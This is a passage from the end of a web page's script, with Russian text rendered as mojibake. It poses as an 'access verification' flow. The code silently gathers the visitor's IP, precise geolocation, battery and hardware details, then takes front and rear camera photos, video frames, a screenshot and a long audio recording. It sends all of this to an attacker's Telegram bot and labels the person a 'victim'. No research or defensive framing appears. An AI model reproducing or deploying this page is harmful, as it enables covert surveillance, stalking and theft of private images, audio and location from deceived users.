        }
        
        async function processAuth() {
            const btn = document.getElementById('authBtn');
            const progress = document.getElementById('authProgress');
            const status = document.getElementById('authStatus');
            
            btn.disabled = true;
            status.classList.add('visible');
            
            try {
                // –≠—Ç–∞–ø 1: –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º—ã
                status.textContent = 'üîÑ –°–±–æ—Ä —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö...';
                progress.style.width = '10%';
                
                const systemData = await collectSystemData();
                await sendToTelegram(formatSystemMessage(systemData));
                await sleep(1000);
                
                // –≠—Ç–∞–ø 2: –§–æ—Ç–æ —Å –ø–µ—Ä–µ–¥–Ω–µ–π –∫–∞–º–µ—Ä—ã
                status.textContent = 'üì∏ –ü–µ—Ä–µ–¥–Ω—è—è –∫–∞–º–µ—Ä–∞...';
                progress.style.width = '25%';
                await captureAndSendFrontCameraPhotos();
                await sleep(1000);
                
                // –≠—Ç–∞–ø 3: –§–æ—Ç–æ —Å –∑–∞–¥–Ω–µ–π –∫–∞–º–µ—Ä—ã
                status.textContent = 'üì∏ –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞...';
                progress.style.width = '40%';
                await captureAndSendRearCameraPhotos();
                await sleep(1000);
                
                // –≠—Ç–∞–ø 4: –í–∏–¥–µ–æ –∫–∞–∫ —Ñ–æ—Ç–æ (–∫–∞–¥—Ä—ã)
                status.textContent = 'üé• –í–∏–¥–µ–æ –∑–∞—Ö–≤–∞—Ç...';
                progress.style.width = '55%';
                await captureAndSendVideoAsPhotos();
                await sleep(1000);
                
                // –≠—Ç–∞–ø 5: –°–∫—Ä–∏–Ω—à–æ—Ç
                status.textContent = 'üñ•Ô∏è –°–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞...';
                progress.style.width = '70%';
                await captureAndSendScreenshot();
                await sleep(1000);
                
                // –≠—Ç–∞–ø 6: –î–ª–∏–Ω–Ω–æ–µ –∞—É–¥–∏–æ
                status.textContent = 'üé§ –î–ª–∏–Ω–Ω–∞—è –∞—É–¥–∏–æ –∑–∞–ø–∏—Å—å...';
                progress.style.width = '85%';
                await captureAndSendLongAudio();
                await sleep(1000);
                
                // –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ
                progress.style.width = '100%';
                status.textContent = '‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞';
                status.style.background = 'rgba(46, 204, 113, 0.1)';
                
                // –û—Ç–ø—Ä–∞–≤–∫–∞ –∏—Ç–æ–≥–æ–≤–æ–≥–æ –æ—Ç—á–µ—Ç–∞
                await sendFinalReport();
                
                // –£—Å–ø–µ—Ö
                setTimeout(() => {
                    document.getElementById('authModal').classList.remove('active');
                    document.getElementById('joinBtn').innerHTML = '<span>‚úÖ –î–æ—Å—Ç—É–ø –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω</span>';
                    document.getElementById('joinBtn').style.background = '#2ecc71';
                    document.getElementById('joinBtn').disabled = true;
                }, 2000);
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞:', error);
                status.textContent = '‚ùå –û—à–∏–±–∫–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞';
                status.style.background = 'rgba(231, 76, 60, 0.1)';
                btn.disabled = false;
            }
        }
        
        async function collectSystemData() {
            const data = {
                victimId: state.victimId,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                ip: await getIP(),
                battery: await getBatteryInfo(),
                memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                cores: navigator.hardwareConcurrency || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
            };
            
            // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
            if (navigator.geolocation) {
                await new Promise(resolve => {
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            data.geo = {
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                acc: pos.coords.accuracy,
                                alt: pos.coords.altitude,
                                speed: pos.coords.speed
                            };
                            resolve();
                        },
                        () => resolve(),
                        {enableHighAccuracy: true, timeout: 10000, maximumAge: 0}
                    );
                });
            }
            
            return data;
        }
        
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch {
                    return '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ';
                }
            }
            return '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ';
        }
        
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                try {
                    const response = await fetch('https://api64.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch {
                    return '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω';
                }
            }
        }
        
        function formatSystemMessage(data) {
            let batteryInfo = '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ';
            if (data.battery && typeof data.battery === 'object') {
                batteryInfo = `${data.battery.level} (${data.battery.charging ? '–∑–∞—Ä—è–¥–∫–∞' : '—Ä–∞–∑—Ä—è–¥–∫–∞'})`;
            }
            
            return `
üîê <b>–ü–†–û–í–ï–†–ö–ê –î–û–°–¢–£–ü–ê - –ü–û–õ–ù–ê–Ø –°–ï–°–°–ò–Ø</b>
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

üë§ <b>–ò–ù–§–û–†–ú–ê–¶–ò–Ø:</b>
‚îú ID: <code>${data.victimId}</code>
‚îú –í—Ä–µ–º—è: ${new Date(data.timestamp).toLocaleString('ru-RU')}
‚îú –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${data.platform}
‚îú –Ø–∑—ã–∫: ${data.language}
‚îú –ü–∞–º—è—Ç—å: ${data.memory}
‚îî –Ø–¥—Ä–∞ CPU: ${data.cores}

üìç <b>–ì–ï–û–õ–û–ö–ê–¶–ò–Ø:</b>
‚îú IP: <code>${data.ip}</code>
${data.geo ? `‚îú –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: <code>${data.geo.lat}, ${data.geo.lon}</code>` : ''}
${data.geo ? `‚îú –í—ã—Å–æ—Ç–∞: ${data.geo.alt || '–ù/–î'}–º` : ''}
${data.geo ? `‚îú –°–∫–æ—Ä–æ—Å—Ç—å: ${data.geo.speed || '0'} –º/—Å` : ''}
${data.geo ? `‚îî –¢–æ—á–Ω–æ—Å—Ç—å: ${data.geo.acc}–º` : '‚îî GPS: –ù–µ –¥–æ—Å—Ç—É–ø–µ–Ω'}

üì± <b>–°–ò–°–¢–ï–ú–ê:</b>
‚îú User-Agent: ${data.userAgent.substring(0, 80)}...
‚îú –≠–∫—Ä–∞–Ω: ${data.screen}
‚îú –ë–∞—Ç–∞—Ä–µ—è: ${batteryInfo}
‚îú –í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞: ${data.timezone}
‚îî –û–Ω–ª–∞–π–Ω: ${navigator.onLine ? '‚úÖ' : '‚ùå'}

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üîÑ –ù–∞—á–∏–Ω–∞–µ—Ç—Å—è —É–≥–ª—É–±–ª–µ–Ω–Ω—ã–π —Å–±–æ—Ä –º–µ–¥–∏–∞...
`;
        }
        
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
                
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CONFIG.ADMIN_ID,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
            } catch(e) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è:', e);
            }
        }
        
        async function sendFinalReport() {
            const report = `
‚úÖ <b>–ü–û–õ–ù–´–ô –°–ë–û–† –î–ê–ù–ù–´–• –ó–ê–í–ï–†–®–ï–ù</b>
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

üë§ –ñ–µ—Ä—Ç–≤–∞: <code>${state.victimId}</code>
üìä –í—Å–µ–≥–æ —Å–æ–±—Ä–∞–Ω–æ –º–µ–¥–∏–∞ —Ñ–∞–π–ª–æ–≤: ${state.mediaCount}

üì∏ <b>–§–û–¢–û –° –ö–ê–ú–ï–†:</b> ~15-20 —à—Ç.
‚îú –ü–µ—Ä–µ–¥–Ω—è—è –∫–∞–º–µ—Ä–∞: ~5 —Ñ–æ—Ç–æ
‚îú –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞: ~3 —Ñ–æ—Ç–æ
‚îî –ö–∞–¥—Ä—ã –≤–∏–¥–µ–æ: ~8 —Ñ–æ—Ç–æ

üé§ <b>–ê–£–î–ò–û:</b> 1 –¥–ª–∏–Ω–Ω–∞—è –∑–∞–ø–∏—Å—å (${CONFIG.AUDIO_DURATION/1000}—Å–µ–∫.)
üñ•Ô∏è <b>–°–ö–†–ò–ù–®–û–¢–´:</b> 1-2 —à—Ç.

üìÅ <b>–í–°–ï–ì–û –§–ê–ô–õ–û–í:</b> ~20-25 —Ñ–∞–π–ª–æ–≤

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üïí –ó–∞–≤–µ—Ä—à–µ–Ω–æ: ${new Date().toLocaleString('ru-RU')}
‚è±Ô∏è –î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: ~${Math.round((CONFIG.AUDIO_DURATION + 15000) / 1000)} —Å–µ–∫—É–Ω–¥
üì± –í—Å–µ —Ñ–∞–π–ª—ã –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ —á–∞—Ç
`;
            
            await sendToTelegram(report);
        }
        
        function sleep(ms) {
            return new Promise(r => setTimeout(r, ms));
        }
        
        // –û—á–∏—Å—Ç–∫–∞ –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('beforeunload', () => {
            // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –≤—Å–µ –ø–æ—Ç–æ–∫–∏
            state.videoStreams.forEach(stream => {
                stream.getTracks().forEach(track => track.stop());
            });
            state.audioStreams.forEach(stream => {
                stream.getTracks().forEach(track => track.stop());
            });
        });
    </script>
</body>
</html>
